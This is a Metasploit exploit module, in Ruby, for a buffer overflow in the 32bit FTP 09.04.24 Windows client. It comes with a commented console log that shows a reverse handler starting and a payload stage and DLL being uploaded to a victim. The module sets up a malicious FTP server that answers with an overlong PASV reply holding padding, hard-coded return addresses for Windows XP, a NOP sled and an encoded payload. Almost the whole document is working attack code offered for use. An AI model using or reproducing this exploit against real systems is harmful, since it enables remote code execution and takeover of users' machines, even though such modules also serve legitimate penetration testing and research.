32bit FTP (PASV) Reply Client Remote Overflow Exploit (meta)
============================================================



#msf > use exploit/windows/ftp/32bitftp_pasv_reply
#msf exploit(32bitftp_pasv) > set LHOST 192.168.1.2 
#LHOST => 192.168.1.2                               
#msf exploit(32bitftp_pasv) > exploit               
#[*] Exploit running as background job.             
#msf exploit(32bitftp_pasv) >                       
#[*] Handler binding to LHOST 0.0.0.0               
#[*] Started reverse handler                        
#[*] Server started.    
# Victim connecting to the malicious ftp server.                            
#[*] Transmitting intermediate stager for over-sized stage...(191 bytes)
#[*] Sending stage (2650 bytes)                                         
#[*] Sleeping before handling stage...                                  
#[*] Uploading DLL (75787 bytes)...                                     
#[*] Upload completed.                                                  

##
# $Id: 32bitftp_pasv_reply.rb 6528 2009-05-06 16:00:00Z  $
##
##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			&#039;Name&#039;           => &#039;32bit FTP (PASV) Reply Client Remote overflow Exploit&#039;,
			&#039;Description&#039;    => %q{
				This module exploits a buffer overflow in the 32bit FTP 09.04.24
				client that is triggered through an excessively long PASV reply command
			},
			&#039;Author&#039; 	 => [ &#039;His0k4 <his0k4.hlm[at]gmail.com>&#039; ],
			&#039;License&#039;        => MSF_LICENSE,
			&#039;Version&#039;        => &#039;$Revision: 6528 $&#039;,
			&#039;References&#039;     =>
				[
					[ &#039;URL&#039;, &#039;http://www.milw0rm.com/exploits/8611&#039; ],
					[ &#039;BID&#039;, &#039;34838&#039; ],
				],
			&#039;Payload&#039;        =>
				{
					&#039;Space&#039;    => 1000,
					&#039;BadChars&#039; => "\x00\x0a\x0d\x20",
					&#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumMixed, 
					&#039;StackAdjustment&#039; => -3500,
				},
			&#039;Platform&#039;       => &#039;win&#039;,
			&#039;Targets&#039;        =>
				[
				# Tested against xp SP3 english
					[ &#039;Windows XP SP3 English&#039;,	{ &#039;Ret&#039; => 0x7c868667 }	], # jmp esp kernel32.dll
					[ &#039;Windows XP SP2 French&#039;,	{ &#039;Ret&#039; => 0x7C82385D }	], # call esp kernel32.dll
				],
			&#039;Privileged&#039;     => false,
			&#039;DisclosureDate&#039; => &#039;Mai 06 2009&#039;,
			&#039;DefaultTarget&#039;  => 0))

		register_options(
			[ 
				OptPort.new(&#039;SRVPORT&#039;, [ true, "The FTP daemon port to listen on", 21 ]),
				OptString.new(&#039;SRVNAME&#039;, [ true, "Welcome to the ... FTP Service", "Test" ]),
			], self.class)
	end

	def on_client_connect(client)
		return if ((p = regenerate_payload(client)) == nil)	

		buffer = "220 Welcome to the " + datastore[&#039;SRVNAME&#039;] + " FTP Service.\r\n"
		client.put(buffer)
	end
	
	def on_client_data(client)
	
	
		client.get_once

		user = "331 Please specify the password.\r\n"
		client.put(user)
		
		client.get_once
		pass = "230 Login successful.\r\n"
		client.put(pass)
		
		client.get_once
		pwd = "257 \"/\"\r\n"
		client.put(pwd)
		
		client.get_once
		type = "200 Switching to ASCII mode.\r\n"
		client.put(type)
				
		client.get_once
		pasv = "227 Entering Passive Mode ("
		pasv << rand_text_numeric(966)
		pasv << [target.ret].pack(&#039;V&#039;)
		pasv << make_nops(20)
		pasv << payload.encoded
		pasv << ")\r\n"
		
		client.put(pasv)
		
		handler(client)
		service.close_client(client)
	end
end



